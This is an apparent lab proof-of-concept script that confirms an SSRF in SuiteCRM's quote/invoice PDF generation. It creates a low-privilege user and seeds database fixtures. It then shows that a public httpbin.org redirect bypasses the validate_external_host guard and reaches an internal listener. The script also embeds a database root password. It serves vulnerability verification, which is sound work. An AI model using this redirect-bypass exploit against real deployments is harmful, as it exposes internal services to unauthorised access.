#!/usr/bin/env python3
"""
VULN-047 -- TCPDF remote <img> server-side fetch SSRF on the AOS quote/
invoice PDF-generation path

Software:    SuiteCRM
Repository:  https://github.com/SuiteCRM/SuiteCRM
Version:     7.15.2 (targets/SuiteCRM/suitecrm_version.php), commit
             62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink:        modules/AOS_PDF_Templates/templateParser.php:155-156 wraps a
             product's `product_image` field in `<img src="...">`,
             TCPDF's overridden Image() (lib/PDF/TCPDF/SuiteTCPDF.php:92-99)
             fetches it server-side while rendering the PDF.
Entry point: entryPoint=generatePdf (modules/AOS_PDF_Templates/generatePdf.php,
             registered auth-required in include/MVC/Controller/
             entry_point_registry.php:80) -- the real "Generate PDF" button
             on any Quote/Invoice, reachable by any authenticated user with
             view access to the record.

*** CORRECTION TO THE STATIC FINDING, discovered dynamically ***
The static write-up (VULN-047.md) states "No validate_external_host()
anywhere in the PDF path". That is FALSE for this commit: SuiteTCPDF.php:95
DOES call validate_external_host($file) before TCPDF fetches an image, and
this script's own Test 1 below (pointing product_image directly at the
internal-only OOB listener, `172.18.0.1:33119`) confirms live that the
guard blocks it -- no OOB hit, no exception, the PDF is generated without
the image. The static finding for this specific sink is REFUTED as
written.

HOWEVER, the sink is still exploitable: TCPDF's own fetch (inside
parent::Image(), the vendored TCPDF library, entirely outside SuiteCRM's
control) follows HTTP redirects with no re-validation, the exact
"validate once, then follow redirects" gap already confirmed for the RSS
dashlet in VULN-094 -- and flagged there as a NEEDS_MANUAL "sibling
candidate" at this exact file:line. Test 2 below confirms that sibling
live: pointing product_image at a genuinely public redirector
(https://httpbin.org/redirect-to) that 302s to the same internal listener
DOES reach it. So this finding is CONFIRMED, but as a redirect-bypass of
a real guard (VULN-094's pattern applied to a second sink), not as the
"zero guard" bug the static write-up describes.

What this script does
----------------------
1. Creates a fresh, non-admin SuiteCRM user.
2. Seeds a minimal AOS_Products + AOS_Quotes + AOS_Products_Quotes (line
   item) + AOS_PDF_Templates fixture directly via `docker compose exec db
   mysql` (documented precondition -- the PDF template's merge-block
   syntax, `<tr>$aos_products_product_image</tr>` HTML-entity-encoded so
   it survives templateParser's tag-stripping pass, was worked out and
   verified independently during analysis; this is fixture setup, not
   part of the vulnerability under test, which is the TCPDF fetch itself).
3. Starts an HTTP listener on 0.0.0.0:33119.
4. TEST 1 (guard sanity check): sets product_image to the internal
   listener directly, calls entryPoint=generatePdf as the low-priv user,
   asserts NO hit -- proves the guard is real.
5. TEST 2 (bypass): sets product_image to a public httpbin.org redirector
   that 302s to the same internal listener, calls generatePdf again,
   asserts a hit WITH the second canary -- proves the guard is bypassed.
"""
import os
import sys
import uuid
import subprocess
import threading
import http.server
import urllib.parse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict, admin_session,
                      create_user, web_login, BROWSER_UA)

VULN_ID = "VULN-047"
OOB_HOST = os.environ.get("OOB_HOST", "172.18.0.1")
OOB_BIND = os.environ.get("OOB_BIND", "0.0.0.0")
OOB_PORT = int(os.environ.get("OOB_PORT", "33119"))
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT", "cvehunterlab_suitecrm")
TARGET_DIR = os.environ.get("TARGET_DIR", "/opt/cvehunter/targets/SuiteCRM")
DB_USER = os.environ.get("DB_USER", "root")
DB_PASS = os.environ.get("DB_PASS", "SuiteRoot!2026x")
DB_NAME = os.environ.get("DB_NAME", "suitecrm")

HERE = os.path.dirname(os.path.abspath(__file__))
EVIDENCE = os.path.join(HERE, "evidence")
os.makedirs(EVIDENCE, exist_ok=True)


class _Handler(http.server.BaseHTTPRequestHandler):
    hits = []

    def log_message(self, fmt, *args):  # noqa: A003
        pass

    def do_GET(self):  # noqa: N802
        _Handler.hits.append({"path": self.path, "headers": dict(self.headers.items())})
        # a tiny valid PNG (1x1) -- content type doesn't matter for the SSRF
        # proof, but a real image body keeps TCPDF from logging noise.
        payload = bytes.fromhex(
            "89504e470d0a1a0a0000000d49484452000000010000000108020000009077"
            "53de0000000a4944415478da6360000002000155ba9ce50000000049454e44ae426082")
        self.send_response(200)
        self.send_header("Content-Type", "image/png")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    do_POST = do_GET


def start_listener():
    srv = http.server.ThreadingHTTPServer((OOB_BIND, OOB_PORT), _Handler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return srv


def mysql_exec(sql):
    cmd = ["docker", "compose", "-p", COMPOSE_PROJECT, "exec", "-T", "db",
           "mysql", f"-u{DB_USER}", f"-p{DB_PASS}", DB_NAME]
    p = subprocess.run(cmd, cwd=TARGET_DIR, input=sql.encode(), capture_output=True, timeout=30)
    out = (p.stdout + p.stderr).decode(errors="replace")
    return p.returncode == 0, out


def main():
    banner(VULN_ID, "TCPDF <img> SSRF on PDF generation (guard-then-redirect-bypass)")

    product_id, quote_id, li_id, tmpl_id = (str(uuid.uuid4()) for _ in range(4))

    log("STEP", "admin web login (provisioning only)")
    admin_s = admin_session()
    log("OK", "admin session established")

    log("STEP", "provisioning a fresh NON-ADMIN user (proves PR:L)")
    user = create_user(admin_s, rand("Pw") + "!2026x")
    log("OK", f"created user {user['user_name']} (id={user['id']})")

    prod_name = rand("prod")
    quote_name = rand("quote")
    tmpl_name = rand("tmpl")
    # HTML-entity-encoded so templateParser's generic <...> tag-stripping
    # pass (modules/AOS_PDF_Templates/generatePdf.php:89-119) runs BEFORE
    # the &lt;/&gt; entities decode back into real <tr></tr> tags -- see
    # notes.md for the verified intermediate merge output.
    description = "&lt;tr&gt;$aos_products_product_image&lt;/tr&gt;"

    log("STEP", f"seeding fixture: AOS_Products({product_id}), AOS_Quotes({quote_id}), "
                f"AOS_Products_Quotes line item({li_id}), AOS_PDF_Templates({tmpl_id})")
    sql = f"""
INSERT INTO aos_products (id,name,date_entered,date_modified,deleted,product_image,price,cost)
VALUES ('{product_id}','{prod_name}',NOW(),NOW(),0,'',1,1);
INSERT INTO aos_quotes (id,name,date_entered,date_modified,deleted,assigned_user_id,created_by,modified_user_id)
VALUES ('{quote_id}','{quote_name}',NOW(),NOW(),0,'{user["id"]}','{user["id"]}','{user["id"]}');
INSERT INTO aos_products_quotes (id,name,date_entered,date_modified,deleted,parent_type,parent_id,product_id,number)
VALUES ('{li_id}','{prod_name}',NOW(),NOW(),0,'AOS_Quotes','{quote_id}','{product_id}',1);
INSERT INTO aos_pdf_templates (id,name,date_entered,date_modified,deleted,active,type,description,pdfheader,pdffooter,margin_left,margin_right,margin_top,margin_bottom,margin_header,margin_footer,page_size,orientation,created_by)
VALUES ('{tmpl_id}','{tmpl_name}',NOW(),NOW(),0,1,'AOS_Quotes','{description}','','',15,15,16,16,9,9,'A4','P','{user["id"]}');
"""
    ok, out = mysql_exec(sql)
    if not ok:
        log("FAIL", f"fixture insert failed: {out}")
        verdict(VULN_ID, "FAILED", "could not seed AOS_Products/Quotes/PDFTemplate fixture")
        sys.exit(1)
    log("OK", "fixture seeded")

    srv = start_listener()
    log("SETUP", f"OOB HTTP listener on {OOB_BIND}:{OOB_PORT} (app reaches it at {OOB_HOST}:{OOB_PORT})")

    log("STEP", f"web login as low-priv user {user['user_name']}")
    victim_s = web_login(user["user_name"], user["password"])
    log("OK", "low-priv session established")

    def set_product_image(url):
        ok, out = mysql_exec(f"UPDATE aos_products SET product_image='{url}' WHERE id='{product_id}';")
        if not ok:
            raise RuntimeError(f"failed to update product_image: {out}")

    def generate_pdf():
        data = {"module": "AOS_Quotes", "uid": quote_id, "templateID": tmpl_id, "task": "pdf"}
        headers = {"Referer": f"{BASE_URL}/index.php?module=AOS_Quotes&action=DetailView&record={quote_id}",
                   "User-Agent": BROWSER_UA}
        return victim_s.post(f"{BASE_URL}/index.php", params={"entryPoint": "generatePdf"},
                              data=data, headers=headers, timeout=60)

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("POST /index.php?entryPoint=generatePdf HTTP/1.1\n")
        f.write("Cookie: PHPSESSID=<low-priv-session>\n\n")
        f.write(f"module=AOS_Quotes&uid={quote_id}&templateID={tmpl_id}&task=pdf\n\n")
        f.write("# product_image on the quote's line-item product is the SSRF target.\n")
        f.write("# TEST 1 (guard sanity check): product_image = direct internal listener -> expect BLOCKED\n")
        f.write("# TEST 2 (bypass): product_image = public httpbin.org redirector -> internal listener -> expect HIT\n")

    # --- TEST 1: direct internal target -- expect the guard to BLOCK it ---
    canary1 = rand("pdfdirect")
    direct_url = f"http://{OOB_HOST}:{OOB_PORT}/canary-{canary1}"
    set_product_image(direct_url)
    log("STEP", f"TEST 1/2 (guard sanity check): product_image = {direct_url} (direct internal IP)")
    r1 = generate_pdf()
    log("INFO", f"generatePdf HTTP {r1.status_code}, content-type={r1.headers.get('Content-Type')}, "
                f"len={len(r1.content)}")
    hit1 = next((h for h in _Handler.hits if canary1 in h["path"]), None)
    if hit1:
        log("INFO", f"unexpected: direct internal target WAS reached ({hit1['path']}) -- "
                     f"validate_external_host() did not block it this time")
    else:
        log("OK", "as expected: validate_external_host() blocked the direct private-IP target "
                   "(SuiteTCPDF.php:95) -- no OOB hit. The static finding's 'no guard at all' "
                   "claim is refuted for this sink; proceeding to the redirect-bypass test.")

    # --- TEST 2: public redirector -> internal target -- expect the BYPASS to succeed ---
    canary2 = rand("pdfredir")
    inner_url = f"http://{OOB_HOST}:{OOB_PORT}/canary-{canary2}"
    outer_url = ("https://httpbin.org/redirect-to?url="
                 + urllib.parse.quote(inner_url, safe="") + "&status_code=302")
    set_product_image(outer_url)
    log("STEP", f"TEST 2/2 (bypass): product_image = {outer_url} (public, guard-approved, 302s internally)")
    r2 = generate_pdf()
    log("INFO", f"generatePdf HTTP {r2.status_code}, content-type={r2.headers.get('Content-Type')}, "
                f"len={len(r2.content)}")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"TEST 1 (direct, expected blocked): HTTP {r1.status_code}, "
                f"content-type={r1.headers.get('Content-Type')}, {len(r1.content)} bytes, "
                f"OOB hit={'yes' if hit1 else 'no'}\n\n")
        f.write(f"TEST 2 (redirect bypass): HTTP {r2.status_code}, "
                f"content-type={r2.headers.get('Content-Type')}, {len(r2.content)} bytes\n")
        f.write(f"First 32 bytes of PDF: {r2.content[:32]!r}\n")

    srv.shutdown()
    with open(os.path.join(EVIDENCE, "oob_listener.log"), "w") as f:
        if not _Handler.hits:
            f.write("(no requests received)\n")
        for h in _Handler.hits:
            f.write(f"GET {h['path']}\n")
            ua = h["headers"].get("User-Agent", "")
            f.write(f"  User-Agent: {ua}\n\n")

    hit2 = next((h for h in _Handler.hits if canary2 in h["path"]), None)

    if hit2 and not hit1:
        log("PROOF", f"OOB listener received GET {hit2['path']} (User-Agent: "
                      f"{hit2['headers'].get('User-Agent','')!r}) during TEST 2 only -- "
                      f"validate_external_host() approved the public httpbin.org URL, then "
                      f"TCPDF's own fetch (vendored library, outside SuiteCRM's guard) followed "
                      f"the 302 straight to the internal-only listener.")
        verdict(VULN_ID, "CONFIRMED",
                f"guard blocks direct internal targets (TEST 1: no hit) but a public redirector "
                f"bypasses it (TEST 2: hit for {inner_url}) -- corrected mechanism vs. the static "
                f"finding, see notes.md")
        sys.exit(0)
    elif hit1:
        # Direct private IP somehow reached -- still a real, even simpler, finding.
        verdict(VULN_ID, "CONFIRMED",
                f"product_image pointed directly at an internal IP was fetched (hit {hit1['path']}) "
                f"-- validate_external_host() did not block it in this run")
        sys.exit(0)
    else:
        verdict(VULN_ID, "FAILED", f"no OOB hit in either test; hits={_Handler.hits}")
        sys.exit(1)


if __name__ == "__main__":
    main()
